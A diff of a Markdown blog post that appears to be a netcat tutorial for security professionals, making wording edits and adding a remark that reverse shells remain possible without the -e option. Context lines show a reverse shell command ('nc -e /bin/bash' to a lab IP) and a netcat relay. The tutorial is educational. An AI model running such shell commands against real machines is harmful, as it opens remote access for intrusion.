@@ -21,10 +21,10 @@ images = ["/img/netcat/netcat.png"]
 Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. Netcat has been referred to as the TCP/IP / networking swiss army knife.
 In this article we'll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc...
 
-If you would like to test out these commands in a lab environment without the need to install them on your own machine have a look at my scenario on [**CYBERRANGES**](https://app.cyberranges.com) using this 
-link.
+If you would like to test out these commands in a lab environment without the need to install them on your own machine have a look at my scenario on [**CYBERRANGES**](https://app.cyberranges.com) using the 
+link below.
 
-https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8
+[Netcat Scenario](https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8)
 
 
 ## Variants
@@ -48,7 +48,7 @@ options.
 
 {{< image src="/img/netcat/netcat-4.png" alt="" position="center" style="border-radius: 8px;" >}}
 
-You notice the -e and -c options which are not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.
+You notice the -e option, this is not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.
 
 ### GNU Netcat
 
@@ -179,6 +179,9 @@ Client (victim machine)
 nc -e /bin/bash 192.168.125.10 8080
 ```
 
+Something to note is that, just because the openbsd version does not have this -e option, does not mean that it is impossible to get a reverse
+shell when it's installed. There are still ways it can be used to achieve a reverse shell.
+
 **Bind shells**
 
 For a bind shell, netcat in server mode listens for a connection and serves the shell process to any connecting client. Netcat running in
@@ -252,7 +255,7 @@ nc -klvnp 8000 -e "/bin/nc 192.168.125.40 8080"
 ```
 Now you can reach the web app on server3 by accessing server2 on port 8000.
 
-### Ncat Extras
+### Ncat Additional Features
 
 From the features the security risks can be seen because there's no encryption on the connection as netcat will write to the connection in its
 rawest form, therefore anyone sniffing the network can capture all your traffic unencrypted in the case of shells and file transfer. For bind shells, 
